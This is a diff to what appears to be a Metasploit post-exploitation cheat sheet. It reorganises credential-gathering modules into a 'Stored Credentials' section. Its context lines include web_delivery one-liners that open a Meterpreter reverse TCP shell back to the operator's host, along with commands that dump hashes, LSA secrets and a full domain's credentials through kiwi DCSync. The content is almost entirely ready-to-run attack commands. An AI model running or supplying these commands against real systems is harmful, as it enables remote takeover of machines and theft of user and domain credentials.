@@ -1217,13 +1217,17 @@ msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPO
 32-Bit
 msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPORT 8787; setg LHOST $MYIP; set TARGET PSH; setg PAYLOAD windows/meterpreter/reverse_tcp; run'
 
++---------- Stored Credentials ----------+
+run post/windows/gather/credentials/windows_autologin
+run post/windows/gather/credentials/gpp
+run post/windows/gather/enum_unattend
+run post/windows/gather/credentials/enum_cred_store
+
 +---------- Exploit Suggester ----------+
 run multi/recon/local_exploit_suggester
 
 +---------- Load Modules ----------+
 load kiwi
-load exploit
-load priv
 load powershell
 
 +---------- Initial Checks ----------+
@@ -1260,12 +1264,8 @@ powershell_execute "ipconfig /all"
 creds_all
 hashdump
 kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"
-run post/windows/gather/credentials/enum_cred_store
-run post/windows/gather/credentials/gpp
 run post/windows/gather/smart_hashdump
 run post/windows/gather/lsa_secrets
-run post/windows/gather/enum_unattend
-run post/windows/gather/credentials/windows_autologin
 
 +---------- File Permissions ----------+
 powershell_execute "(Get-Acl 'C:\secret.txt').Access | Format-Table"
